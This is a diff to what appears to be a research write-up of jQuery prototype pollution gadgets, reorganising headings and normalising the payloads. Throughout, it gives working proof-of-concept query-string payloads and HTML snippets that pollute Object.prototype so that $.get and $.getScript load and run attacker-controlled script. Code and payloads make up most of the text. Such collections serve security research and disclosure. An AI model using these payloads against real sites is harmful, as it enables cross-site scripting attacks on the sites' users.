@@ -2,7 +2,8 @@
 
 URL: https://jquery.com/
 
-### PoC $.get jQuery >= 3.0.0
+### PoC
+#### $.get jQuery >= 3.0.0
 ```
 ?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
 ```
@@ -19,7 +20,7 @@ URL: https://jquery.com/
 </script>
 ```
 
-### PoC $.getScript jQuery >= 3.4.0
+#### $.getScript jQuery >= 3.4.0
 ```
 ?__proto__[src][]=data:,alert(1)//
 ```
@@ -34,16 +35,18 @@ URL: https://jquery.com/
 </script>
 ```
 
-### POC $.getScript jQuery == 3.3.1
+#### $.getScript jQuery 3.0.0 - 3.3.1
 
 ```
-?__proto__.url=data:,alert(1337)//
+?__proto__.url=data:,alert(1)//
 ```
 
 ```html
 <script/src=https://code.jquery.com/jquery-3.3.1.js></script>
 <script>
-  Object.prototype.url = "data:,alert(1337)//"
+  Object.prototype.url = 'data:,alert(1)//'
 </script>
-<script>$.getScript('https://google.com/')</script>
+<script>
+  $.getScript('https://google.com/')
+</script>
 ```
